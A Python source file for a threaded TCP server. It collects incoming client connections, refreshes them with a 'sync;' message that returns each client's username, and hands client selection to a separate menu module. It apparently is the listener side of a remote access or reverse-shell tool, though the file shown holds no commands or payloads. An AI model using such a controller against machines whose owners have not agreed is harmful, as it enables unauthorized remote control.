# -*- coding: utf-8 -*-

import socket
import threading
from contextlib import suppress

from menu import Menu


class Server(object):

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)

    def run(self):
        self._enable_threading()
        Menu(self).main_menu()

    def accept_connections(self):
        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append(ClientConnection(socket, addr))

    def close_connections(self):
        with self.locking:
            for client in self.connections:
                client.close()

    def refresh_connections(self):
        index = 0
        table = []
        with self.locking:
            for client in self.connections:
                if client.sync():
                    table.append((index, client.username, client.address))
                    index += 1
                else:
                    self.connections.remove(client)
        return table

    def _enable_threading(self):
        thread = threading.Thread(target=self.accept_connections)
        thread.daemon = True
        thread.start()

    def search_client(self, client_id):
        with suppress(IndexError, ValueError):
            with self.locking:
                client = self.connections[int(client_id)]
                return client


class ClientConnection(object):

    def __init__(self, socket, address, username=None):
        self.socket = socket
        self.address = address
        self.username = username

    def close(self):
        self.socket.shutdown(2)
        self.socket.close()

    def sync(self):
        self.socket.sendall("sync;".encode('utf-8'))
        self.username = self.socket.recv(1024).decode('utf-8')
        return True if self.username else False
